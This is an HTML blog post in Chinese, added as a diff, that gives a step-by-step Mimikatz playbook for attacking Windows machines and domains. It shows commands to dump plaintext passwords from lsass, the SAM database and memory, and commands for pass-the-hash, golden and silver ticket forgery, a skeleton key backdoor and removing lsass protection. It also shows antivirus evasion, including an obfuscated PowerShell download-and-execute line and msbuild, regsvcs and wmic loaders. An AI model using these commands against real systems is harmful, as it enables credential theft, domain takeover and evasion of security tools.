@@ -1,0 +1,877 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+       
+      <meta name="keywords" content="生活，思考 ，渗透，审计，代码。。。" />
+       
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>Mimikatz运行姿势 |  小透的少年江湖</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/haoyun.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-Mimikatz运行姿势"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  Mimikatz运行姿势
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/" class="article-date">
+  <time datetime="2021-11-03T12:56:59.338Z" itemprop="datePublished">2021-11-03</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a> / <a class="article-category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/">渗透工具</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">1.8k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">7 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="Mimikatz运行姿势"><a href="#Mimikatz运行姿势" class="headerlink" title="Mimikatz运行姿势"></a>Mimikatz运行姿势</h1><hr>
+<p>上篇文章记录了Mimikatz神器的基本命令和很多模块的使用方法命令。由于在实际环境中可能会产生不同的问题，这篇文章记录学习Mimikatz工具的使用姿势和一些免杀方法。</p>
+<h2 id="获取本地账户密码"><a href="#获取本地账户密码" class="headerlink" title="获取本地账户密码"></a>获取本地账户密码</h2><hr>
+<h3 id="本地执行"><a href="#本地执行" class="headerlink" title="本地执行"></a>本地执行</h3><p>首先将执行权限提升为debug权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103103351984.png" class title="image-20211103103351984">
+
+
+
+<p>使用sekurlsa模块抓取明文密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103103420451.png" class title="image-20211103103420451">
+
+
+
+<p>注:当目标为win10或2012R2以上时，默认禁止在内存中保存明文密码，但可以通过修改注册表的方式来抓取明文。</p>
+<p>修改命令如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\Sec urityProviders\WDigest  /v UseLogonCredential /t REG_DWORD  /d  1  /f</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103105046333.png" class title="image-20211103105046333">
+
+
+
+<h3 id="SAM表离线获取hash"><a href="#SAM表离线获取hash" class="headerlink" title="SAM表离线获取hash"></a>SAM表离线获取hash</h3><p>导出SAM数据库的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg  save  HKLM\SYSTEM  SYSTEM(自定义名称)</span><br><span class="line"></span><br><span class="line">reg  save  HKLM\SAM SAM(自定义名称)</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103110249663.png" class title="image-20211103110249663">
+
+
+
+<p>提取导出SAM数据中的hash(确保Mimikatz和导出文件在同一目录下或者指定SAM数据的绝对&#x2F;相对路径)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam /sam:SAM(自定义名称)  /system:SYSTEM(自定义名称)</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103110638898.png" class title="image-20211103110638898">
+
+
+
+<h2 id="Procdump-Mimikatz"><a href="#Procdump-Mimikatz" class="headerlink" title="Procdump+Mimikatz"></a>Procdump+Mimikatz</h2><hr>
+<p>当mimikatz无法在目标主机上正常运行时，可以使用微软提供的工具Procdump导出lsass.exe进程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procsump64.exe -accepteula -ma lsass.exe  lsass.tmp</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103111347692.png" class title="image-20211103111347692">
+
+
+
+<p>使用 mimikatz的sekurlsa模块对导出的lsass.dmp文件。先使用minidump恢复到lsass.exe的状态，然后使用logonpasswords导出明文密码信息</p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103113844380.png" class title="image-20211103113844380">
+
+
+
+<p>可看到passwords.txt文档中系统的明文密码信息</p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103115851943.png" class title="image-20211103115851943">
+
+
+
+<h2 id="哈希传递攻击PTH"><a href="#哈希传递攻击PTH" class="headerlink" title="哈希传递攻击PTH"></a>哈希传递攻击PTH</h2><hr>
+<h3 id="工作组环境"><a href="#工作组环境" class="headerlink" title="工作组环境"></a>工作组环境</h3><p>当我们获取到某一台主机中用户的NTLM哈希值时，可以直接将获取到的NTLM哈希值登录目标主机</p>
+<p>命令；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa:pt /user:用户名   /domain:ip地址    /ntlm:用户的ntlm哈希值</span><br></pre></td></tr></table></figure>
+
+<p>如下所示，我们可以直接登录目标主机cmd管理窗口，执行命令</p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103130911394.png" class title="image-20211103130911394">
+
+<p>注：只能在 mimikatz 弹出的 cmd 窗口才可以执行这些操作，注入成功后，可以使用psexec、wmic、wmiexec等实现远程执行命令</p>
+<h3 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h3><p>在域环境下，如果获取到某一用户的ntlm哈希值，可以在域环境下任意主机登录用户，若获取到域控 管理员的账号和ntlm哈希值即可 登录域控。</p>
+<p>命令:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa:pth  /user:用户  /domain:&quot;域名&quot;  /ntlm:用户ntlm哈希值</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="票据传递攻击"><a href="#票据传递攻击" class="headerlink" title="票据传递攻击"></a>票据传递攻击</h2><hr>
+<h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>在域环境下，每个用户的ticcket都是由krbtgt的密码NTLM哈希进行加密传输的，只要获取到krbtgt用户的密码NTLM哈希值就可以随意伪造Ticket，从而使用Ticket登录域控，使用krbtgt用户密码HTLM哈希生成的票据为黄金票据</p>
+<p>首先获取krbtft用户的NTLM哈希值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz  &quot;lsamdump::dcsync  /domain:xxx.com  /user:krbtgt&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>利用mimikatz生成域管理员权限的黄金票据，输入域管理员对应的账号，域名称和sid值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:administrator /domain:xxx.COM /sid:管理员SID值 /krbtgt:krbtgt用户的哈希值 /ticket:test.kiribi(生成的票据)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>导出上面生成的票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt  test.kiribi</span><br></pre></td></tr></table></figure>
+
+
+
+<p>查看导入后获取的域管权限，查看主机的目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir  \\$DC$.xxx.com\c$</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p>白银票据是伪造 TGS(票据授权服务)，只能访问指定的服务，由客户端计算机账号的NTLM哈希值进行加密。</p>
+<p>下面使用白银票据伪造CIFS(用于Windows主机之间进行网络文件共享)服务权限</p>
+<p>提升权限，获取主机账号的哈希值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">sekurlsa::logonpasswords</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103161547663.png" class title="image-20211103161547663">
+
+<p>这里的liukaifeng01的SID为S-1-5-21-295270202-1353902439-2381782089(不要后面的-1000)</p>
+<p>伪造的OWA的NTLM哈希为84883cf100e1f84e2a2468f08d6d0e4f</p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103162043108.png" class title="image-20211103162043108">
+
+
+
+<p>生成白银票据命令 :</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:[domain] /sid:[SID] /target:服务用户.xxx.com /rc4:[server&#x27;s Hash] /service:[service] /user:[username] /ptt</span><br></pre></td></tr></table></figure>
+
+
+
+<p>如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:GOD /sid:S-1-5-21-295270202-1353902439-2381782089( /target:OWA.GOD.com /rc4:84883cf100e1f84e2a2468f08d6d0e4f /service:cifs /user:liukaifeng01 /ptt</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103162850526.png" class title="image-20211103162850526">
+
+<p>可以看到此时的liukaifeng01的key变成了OWA的，服务为cifs，生成了获取cifs的白银票据</p>
+<p>伪造白银票据后，我们就可以远程访问DC</p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103163128580.png" class title="image-20211103163128580">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注:若使用dir \\主机名\c$不能访问，则输入主机全名dir \\主机名.域名.com\c$</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="万能密钥"><a href="#万能密钥" class="headerlink" title="万能密钥"></a>万能密钥</h3><p>skeleton key(万能钥匙)就是给所有域内用户添加一个相同的密码，域内所有的用户 都可以使用这个密码进行认证，同时原始密码也可以使用，其原理是对 lsass.exe 进行注 入，所以重启后会失效</p>
+<p>在域控上安装skeleton key</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe privilege::debug &quot;misc::skeleton&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103171351475.png" class title="image-20211103171351475">
+
+
+
+<p>在域内其他机器使用skeleton key去访问域控，添加密码围殴mimikatz</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net  use   \\主机名.xxx.com\c$  mimikatz(密码)  /user:adtest \administrator</span><br></pre></td></tr></table></figure>
+
+
+
+<p>微软在 2014 年 3 月 12 日添加了 LSA 爆护策略，用来防止对进程 lsass.exe 的代码注入。如果直接尝试添加 skelenton key 会失败。</p>
+<p>但mimikatz依然可以绕过，需要导入mimidrv.sys文件，命令如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">!+</span><br><span class="line">!processprotect /process:lsass.exe /remove </span><br><span class="line">misc::skeleton</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103172059633.png" class title="image-20211103172059633">
+
+
+
+<h2 id="免杀处理"><a href="#免杀处理" class="headerlink" title="免杀处理"></a>免杀处理</h2><hr>
+<h3 id="Invoke-Mimikatz"><a href="#Invoke-Mimikatz" class="headerlink" title="Invoke-Mimikatz"></a>Invoke-Mimikatz</h3><p>在powershell中导入invoke-Mimikatz.ps1，加载mimikatz模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass “import-module .Invoke-Mimikatz.ps1”</span><br></pre></td></tr></table></figure>
+
+<p>运行mimikazt模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass “invoke-Mimikatz”</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103194723187.png" class title="image-20211103194723187">
+
+<p>在cmd中运行过程中没有被拦截</p>
+<p>使用poweshell加载远程服务器的ps脚本，会被360拦截</p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103200143717.png" class title="image-20211103200143717">
+
+
+
+<p>稍微做了简单的混淆</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot; (&#x27;IEX &#x27;+&#x27;(Ne&#x27;+&#x27;w-O&#x27;+&#x27;bject Ne&#x27;+&#x27;t.W&#x27;+&#x27;ebClien&#x27;+&#x27;t).Do&#x27;+&#x27;wnloadS&#x27;+&#x27;trin&#x27;+&#x27;g&#x27;+&#x27;(&#x27;+&#x27;1vchttp://&#x27;+&#x27;192.168.211&#x27;+&#x27;.1/&#x27;+&#x27;Inv&#x27;+&#x27;oke-Mimik&#x27;+&#x27;a&#x27;+&#x27;tz.&#x27;+&#x27;ps11v&#x27;+&#x27;c)&#x27;+&#x27;;&#x27;+&#x27;I&#x27;+&#x27;nvoke-Mimika&#x27;+&#x27;tz&#x27;).REplaCE(&#x27;1vc&#x27;,[STRing][CHAR]39)|IeX&quot;</span><br></pre></td></tr></table></figure>
+
+<p>还是被拦截</p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103200627835.png" class title="image-20211103200627835">
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103200702681.png" class title="image-20211103200702681">
+
+
+
+<p>所以最好将Invoke-Mimikatz.ps1文件放置在目标主机上执行powershell加载模块运行imikatz</p>
+<h3 id="使用-net2-0"><a href="#使用-net2-0" class="headerlink" title="使用.net2.0"></a>使用.net2.0</h3><p>首先下载<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/ssssanr/Mimikatz-Csharp/master/katz.cs">katz.cs</a>，将katz.cs文件保存到本地</p>
+<p>并放在对应的系统版本的Framework目录中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">32位：C:\Windows\Microsoft.NET\Framework\v2.0.50727</span><br><span class="line">64位：C:\Windows\Microsoft.NET\Framework64\v2.0.50727</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后在powershell中执行命令生成key.snk</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$key=&#x27;BwIA AAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z 6 4cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5cl HIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4=&#x27;</span><br><span class="line"></span><br><span class="line">$Content = [System.Convert]::FromBase64String($key)</span><br><span class="line"></span><br><span class="line">Set-Content key.snk -Value $Content -Encoding Byte</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103202206247.png" class title="image-20211103202206247">
+
+
+
+<p>最后生成mimikatz，在运行mimikatz</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">32位:</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727&gt;.\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz.cs C:\Windows\Microsoft.NET\Framework\v2.0.50727&gt;.\regsvcs.exe katz.exe</span><br><span class="line"></span><br><span class="line">64位:</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v2.0.5072 7&gt;.\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz.cs C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;.\regsvcs.exe katz.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>在运行时被360发现啦，火绒没有反应</p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103202433218.png" class title="image-20211103202433218">
+
+
+
+<h3 id="使用-net4-0"><a href="#使用-net4-0" class="headerlink" title="使用.net4.0"></a>使用.net4.0</h3><p>下载[mimikatz.xml](<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes">https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes</a> mimikatz.xml)，将其保存在Framework64文件下的v4,0文件下并运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msbuild.exe mimikatz.xml</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103203026847.png" class title="image-20211103203026847">
+
+<p>360和火绒都没有报毒和进行拦截</p>
+<h3 id="js加载mimikatz"><a href="#js加载mimikatz" class="headerlink" title="js加载mimikatz"></a>js加载mimikatz</h3><p>下载<a target="_blank" rel="noopener" href="https://gist.github.com/500646/14051b27b45dce37818aca915e93062f/raw/2adcc9d2570b4367c6cc405e5a5969863d04fc9b/katz.js">katz.js</a>，执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scsript mimikatz.js</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103204511543.png" class title="image-20211103204511543">
+
+
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103204537821.png" class title="image-20211103204537821">
+
+<p>360拦截了，火绒没绕过</p>
+<h3 id="jscript的xsl版"><a href="#jscript的xsl版" class="headerlink" title="jscript的xsl版"></a>jscript的xsl版</h3><p>本地加载mimikatz.xsl文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic os get /format:&quot;mimikatz.xsl&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103204250467.png" class title="image-20211103204250467">
+
+<p>360和火绒都没有拦截</p>
+<h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><hr>
+<h3 id="导出chrome中的密码"><a href="#导出chrome中的密码" class="headerlink" title="导出chrome中的密码"></a>导出chrome中的密码</h3><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIzOTg0NjYzNg==&mid=2247483949&idx=1&sn=db4853c88e4bf0a550c095d9017a363c&chksm=e92297aede551eb815a604ba944c4666b260c5bfe044e1b3a60946b586fd5679e29db0adf18d&mpshare=1&scene=23&srcid=&sharer_sharetime=1582350092849&sharer_shareid=d32981e13d51bf06188894426d2a54e5#rd">使用mimikatz导出chrome中的密码 (qq.com)</a></p>
+<h3 id="隐藏功能"><a href="#隐藏功能" class="headerlink" title="隐藏功能"></a>隐藏功能</h3><p>管理员常常会禁用一些重要程序的运行，比如cmd、regedit、taskmgr，此时不方便渗透的进一步进行，这里除了去改回原来的配置，还可以借助mimikatz的一些功能：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Copyprivilege::debug</span><br><span class="line">misc::cmd</span><br><span class="line">misc::regedit</span><br><span class="line">misc::taskmgr</span><br></pre></td></tr></table></figure>
+
+
+
+ 
+      <!-- reward -->
+      
+      <div id="reword-out">
+        <div id="reward-btn">
+          打赏
+        </div>
+      </div>
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8-%E5%85%8D%E6%9D%80%E5%A4%84%E7%90%86/" rel="tag">-内网渗透 -工具使用 -免杀处理</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            fastjson1.2.24反序列化
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2021/11/01/windows%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">Windows令牌假冒</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.staticfile.org/valine/1.4.16/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "BAHT50PldtBLrMFvOb5LqqlL-gzGzoHsz",
+    app_key: "tj3HfiFvtJ3pRIhgXGBqdN7b",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+   
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2021-2022
+        <i class="ri-heart-fill heart_icon"></i> John Doe
+      </li>
+    </ul>
+    <ul>
